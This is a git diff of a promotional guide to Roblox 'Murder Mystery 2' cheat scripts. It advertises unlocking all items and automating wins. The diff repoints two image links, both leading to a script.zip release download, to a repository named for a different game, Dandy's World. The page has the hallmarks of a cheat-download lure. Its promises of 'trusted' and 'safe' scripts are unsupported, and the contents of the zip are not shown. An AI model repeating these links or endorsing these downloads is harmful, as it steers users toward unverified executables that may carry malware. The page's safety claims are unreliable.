@@ -5,10 +5,10 @@
 In this guide, we’ll explore everything you need to know about **Murder Mystery 2 scripts** in 2025. Whether you want to **unlock all items**, **automate winning rounds**, or just **have fun** without the grind — these scripts offer powerful tools to enhance your experience. We’ll dive into **how scripts work**, their **key features**, **how to safely use them**, and **where to download trusted scripts**.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Packet-star/studious-fishstick/releases/download/new/script.zip)
+](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
 
 [![maxresdefault](https://github.com/user-attachments/assets/cd058e06-e97d-43b2-a020-f4a984b6cc6b)
-](https://github.com/Packet-star/studious-fishstick/releases/download/new/script.zip)
+](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
 
 ---
 
